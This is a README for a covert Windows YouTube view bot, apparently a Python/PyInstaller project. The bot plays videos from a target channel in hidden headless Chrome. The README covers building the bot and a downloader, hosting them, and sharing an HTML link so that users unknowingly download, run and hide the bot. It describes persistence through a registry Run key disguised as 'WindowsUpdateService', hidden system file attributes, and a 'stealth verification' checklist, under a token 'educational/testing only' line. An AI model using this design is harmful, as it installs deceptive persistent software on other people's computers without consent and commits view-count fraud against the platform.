# YouTube Channel Video Viewer Bot

Covert Windows application that automatically plays random videos from a specified YouTube channel in headless Chrome. Runs silently in background, starts on boot via registry. Packaged as standalone EXE. Includes downloader for distribution.

## Features
- Headless browser (no UI visible).
- Auto-downloads ChromeDriver.
- Random video selection & play duration (1-5 min).
- Persistence via Windows registry (disguised as \"WindowsUpdateService\").
- Hidden system file (+h +s attrib).
- Silent execution (no console).

## Setup & Build
1. Python 3.12+ installed.
2. `venv/Scripts/activate` (or use full paths).
3. Dependencies installed (requirements.txt or direct pip).

**Build Standalone EXEs:**
```cmd
# Activate venv
c:/Users/phres/OneDrive/Desktop/Projects/letsee/venv/Scripts/activate.bat

# Build view_bot.exe (viewer)
pyinstaller --onefile --windowed --name view_bot --hidden-import=webdriver_manager view_bot.py

# Build downloader.exe (optional, for distribution)
pyinstaller --onefile --windowed --name downloader --hidden-import=winreg downloader.py
```
- Outputs in `dist/`: view_bot.exe, downloader.exe (~100-200MB due to ChromeDriver deps).

## Configuration
- **view_bot.py**: Set `CHANNEL_URL = 'https://www.youtube.com/c/YourTargetChannel/videos'`
- **downloader.py**: Set `EXECUTABLE_URL = 'http://yourserver.com/view_bot.exe'`

## Hosting & Distribution
1. Upload `view_bot.exe` to your webserver.
2. Update `downloader.py` URL, rebuild if needed.
3. Host `index.html` & `downloader.py` / `downloader.exe`.
4. Share HTML link. User runs downloader -> auto-downloads/runs/hides view_bot.exe.

## Stealth Verification
- File: Hidden in cwd (`attrib view_bot.exe` shows HS).
- Process: `view_bot.exe` in Task Manager (Details tab), no window.
- Startup: `reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdateService`
- Logs: None (silent); test non-headless first.

## Testing
```cmd
# Test script (headless)
venv/Scripts/python.exe view_bot.py  # Ctrl+C to stop

# Test downloader (set local URL, mock)
python downloader.py
```

## Notes
- YouTube selectors may change; update if needed.
- Host on HTTPS for trust.
- Size large due to bundling; optimize with --exclude-module if possible.
- Legal: Ensure channel allows views; for educational/testing only.

Built with Selenium 4.25, PyInstaller 6.10.

